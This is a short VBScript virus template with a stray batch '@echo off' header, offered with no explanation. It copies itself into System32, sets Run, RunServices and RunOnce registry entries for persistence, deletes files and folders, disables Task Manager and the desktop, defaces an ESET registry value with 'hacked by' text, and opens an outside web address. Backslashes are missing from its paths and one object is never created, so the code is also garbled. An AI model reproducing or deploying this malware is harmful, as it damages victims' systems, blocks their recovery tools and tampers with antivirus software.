@echo off
Set Shell = CreateObject("Wscript.Shell")
Set Application = CreateObject("Shell.Application")
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set File = FileSystemObject.GetFile(WScript.ScriptFullName)
On Error Resume Next
File.Copy ("c:windowsSystem32virus.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunvirus", "C:WINDOWSSYSTEM32virus.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunServicesvirus", "C:WINDOWSSYSTEM32virus.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunOncevirus", "C:WINDOWSSYSTEM32virus.vbs"
Shell.popup "message",5, "heading", 0+16
FileSystemObject.deletefolder"C:example",True
FileSystemObject.deletefile"C:example.txt",True
Shell.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystemDisabletaskmgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USERSoftwaremIRCLicense", "blabla"
Shell.RegWrite "HKEY_LOCAL_MACHINESOFTWAREESETESET SecurityCurrentVersionInfoEditionName", "hacked by ваш ник ;)))"
Shell.RegDelete "HKEY_CURRENT_USERexample"
Shell.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoDesktop", 1, "REG_DWORD"
Application.MinimizeAll
InternerExplorer.Visible = True
InternerExplorer.Navigate "http://granby.ldmi.net/iwF5nR/index.html"